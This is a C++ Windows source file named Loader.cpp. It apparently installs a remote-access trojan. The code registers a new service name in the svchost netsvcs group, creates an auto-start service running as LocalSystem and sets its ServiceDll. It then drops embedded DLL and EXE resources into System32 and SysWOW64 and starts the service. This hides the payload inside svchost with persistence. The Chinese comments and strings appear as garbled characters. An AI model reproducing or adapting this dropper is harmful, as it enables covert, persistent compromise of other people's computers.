// Loader.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include "RegEditEx.h"
#include "resource.h"


bool CreateMyFile(char* strFilePath,LPBYTE lpBuffer,DWORD dwSize)
{
	DWORD dwWritten;
	
	HANDLE hFile = CreateFile(strFilePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
	if (hFile != NULL)
	{
		WriteFile(hFile, (LPCVOID)lpBuffer, dwSize, &dwWritten, NULL);
	}
	else
	{
		MessageBox(NULL, "WriteFileʧ�ܣ�", "����", MB_OK | MB_ICONINFORMATION);
		return false;
	}
	CloseHandle(hFile);
	return true;
}
                       //Ҫ�ͷŵ�·��   ��ԴID            ��Դ��
bool CreateEXE(char* strFilePath,int nResourceID,char* strResourceName)
{
	HRSRC hResInfo;
	HGLOBAL hResData;
	DWORD dwSize;
	LPBYTE p;
	// �����������Դ
	hResInfo = FindResource(NULL, MAKEINTRESOURCE(nResourceID), strResourceName);
	if (hResInfo == NULL)
	{
		MessageBox(NULL, "������Դʧ�ܣ�", "����", MB_OK | MB_ICONINFORMATION);
		return false;
	}
	// �����Դ�ߴ�
	dwSize = SizeofResource(NULL, hResInfo);
	// װ����Դ
	hResData = LoadResource(NULL, hResInfo);
	if (hResData == NULL)
	{
		MessageBox(NULL, "װ����Դʧ�ܣ�", "����", MB_OK | MB_ICONINFORMATION);
		return false;
	}
	// Ϊ���ݷ���ռ�
	p = (LPBYTE)GlobalAlloc(GPTR, dwSize);
	if (p == NULL)
	{
		MessageBox(NULL, "�����ڴ�ʧ�ܣ�", "����", MB_OK | MB_ICONINFORMATION);
		return false;
	}
	// ������Դ����
	CopyMemory((LPVOID)p, (LPCVOID)LockResource(hResData), dwSize);	
	
	bool bRet = CreateMyFile(strFilePath,p,dwSize);
	if(!bRet)
	{
		GlobalFree((HGLOBAL)p);
		return false;
	}
	
	GlobalFree((HGLOBAL)p);
	
	return true;
}

char *AddsvchostService()
{
	char	*lpServiceName = NULL;
	int rc = 0;
	HKEY hkRoot;
    char buff[2048];
	//��װ����svchost��������ע����
    //query svchost setting
    char *ptr, *pSvchost = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost";
    rc = RegOpenKeyEx(HKEY_LOCAL_MACHINE, pSvchost, 0, KEY_ALL_ACCESS, &hkRoot);
    if(ERROR_SUCCESS != rc)
        return NULL;
	
    DWORD type, size = sizeof buff;
	//ö�������еķ�����
    rc = RegQueryValueEx(hkRoot, "netsvcs", 0, &type, (unsigned char*)buff, &size);
    SetLastError(rc);
    if(ERROR_SUCCESS != rc)
        RegCloseKey(hkRoot);
	
	int i = 0;
	bool bExist = false;
	char servicename[50];
	do
	{	
        //���������������ķ�����netsvcs_0��netsvcs_1��������������
		wsprintf(servicename, "netsvcs_%d", i);
		for(ptr = buff; *ptr; ptr = strchr(ptr, 0)+1)
		{
			//Ȼ��ȶ�һ�·��������Ƿ������������
			if (lstrcmpi(ptr, servicename) == 0)
			{	
				bExist = true;
				break;              //���û�о�����
			}
		}
		if (bExist == false)
			break;
		bExist = false;
		i++;
	} while(1);
	
	servicename[lstrlen(servicename) + 1] = '\0';
	//Ȼ�����������д�����з������ĺ��棬
	//��Ҫ���룬ֱ����api��һ��ע���ļ�ֵ�������һЩ��Ϣ
	memcpy(buff + size - 1, servicename, lstrlen(servicename) + 2);
    //Ȼ�󽫺����·������Ļ�����д��ע���ע�����ԭ�����ݱ�����
    rc = RegSetValueEx(hkRoot, "netsvcs", 0, REG_MULTI_SZ, (unsigned char*)buff, size + lstrlen(servicename) + 1);
	
	RegCloseKey(hkRoot);
	
    SetLastError(rc);
	
	if (bExist == false)
	{
		lpServiceName = new char[lstrlen(servicename) + 1];
		lstrcpy(lpServiceName, servicename);
	}
	//�ص� InstallService
	return lpServiceName;
}
  
void StartService(LPCTSTR lpService)
{
	SC_HANDLE hSCManager = OpenSCManager( NULL, NULL,SC_MANAGER_CREATE_SERVICE );
	if ( NULL != hSCManager )
	{
		SC_HANDLE hService = OpenService(hSCManager, lpService, DELETE | SERVICE_START);
		if ( NULL != hService )
		{
			StartService(hService, 0, NULL);
			CloseServiceHandle( hService );
		}
		CloseServiceHandle( hSCManager );
	}
}

int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
 	// TODO: Place code here.
    char *lpServiceDescription="�˷���ΪԶ�̹������������,�����û�а�װ�������,�뽫�˷���ɾ��!";
	char strModulePath[MAX_PATH];
	char	strSysDir[MAX_PATH];
	char strSubKey[1024];
	DWORD	dwStartType = 0;
	char	strRegKey[1024];
	int rc = 0;
    HKEY hkRoot = HKEY_LOCAL_MACHINE, hkParam = 0;
    SC_HANDLE hscm = NULL, schService = NULL;

	    	//�򿪷���
    hscm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	GetSystemDirectory(strSysDir, sizeof(strSysDir));
	char *bin = "%SystemRoot%\\System32\\svchost.exe -k netsvcs";
	char *lpServiceName=AddsvchostService();                             //*��ӵĴ��������������*
	char lpServiceDisplayName[128];
	wsprintf(lpServiceDisplayName,"%s_ms",lpServiceName);
	//���ﷵ���µķ�������͹������dll������
	memset(strModulePath, 0, sizeof(strModulePath));
	wsprintf(strModulePath, "%s\\%sex.dll", strSysDir, lpServiceName);
	
	//Ȼ��������е�������Ϣ��λ��
	wsprintf(strRegKey, "MACHINE\\SYSTEM\\CurrentControlSet\\Services\\%s", lpServiceName);

	  //��������    	
	schService = CreateService(
		hscm,                      // SCManager database
		lpServiceName,                    // name of service
		lpServiceDisplayName,           // service name to display
		SERVICE_ALL_ACCESS,        // desired access
		SERVICE_WIN32_OWN_PROCESS,
		SERVICE_AUTO_START,      // start type
		SERVICE_ERROR_NORMAL,      // error control type
		bin,        // service's binary
		NULL,                      // no load ordering group
		NULL,                      // no tag identifier
		NULL,                      // no dependencies
		NULL,                      // LocalSystem account
		NULL);                     // no password
	dwStartType = SERVICE_WIN32_OWN_PROCESS;
	
	if (schService == NULL)
	{
		::MessageBox(0,"schService == NULL111",0,0);
		throw "CreateService(Parameters)";
	}
	
	CloseServiceHandle(schService);
	CloseServiceHandle(hscm);

	//д����������:
       	hkRoot = HKEY_LOCAL_MACHINE;
	//���ﹹ������������
	wsprintf(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s", lpServiceName);
	
	if (dwStartType == SERVICE_WIN32_SHARE_PROCESS)
	{		
		DWORD	dwServiceType = 0x120;
		
		//д����������
		WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, "Type", REG_DWORD, (char *)&dwServiceType, sizeof(DWORD), 0);
	}
	//д����������
	WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, "Description", REG_SZ, (char *)lpServiceDescription, lstrlen(lpServiceDescription), 0);
	
	lstrcat(strSubKey, "\\Parameters");
	//д����������
	WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, "ServiceDll", REG_EXPAND_SZ, (char *)strModulePath, lstrlen(strModulePath), 0);
		    
   		
	char * strModulePath1="C:\\Windows\\SysWOW64\\MainDll.dll";
	char * strModulePath2="C:\\Windows\\SysWOW64\\netsvcs_x.exe";


	if (schService!=NULL)
	{
		//	::MessageBox(0,"schService!=NULL",0,0);
			if( CreateEXE(strModulePath,IDR_DLL0,"DLL")&&CreateEXE(strModulePath1,IDR_DLL1,"DLL")&&CreateEXE(strModulePath2,IDR_DLL2,"DLL"))
			{
				//	::MessageBox(0,strModulePath,"CreateEXE success",0);
	         	StartService(lpServiceName);
			}
			else
			{
				::MessageBox(0,"CreateEXE false",0,0);
			}
	}
	else
	{
		::MessageBox(0,"schService == NULL",0,0);
	}
	
	
	RegCloseKey(hkRoot);
	RegCloseKey(hkParam);
	CloseServiceHandle(schService);
	CloseServiceHandle(hscm);


	return 0;
}



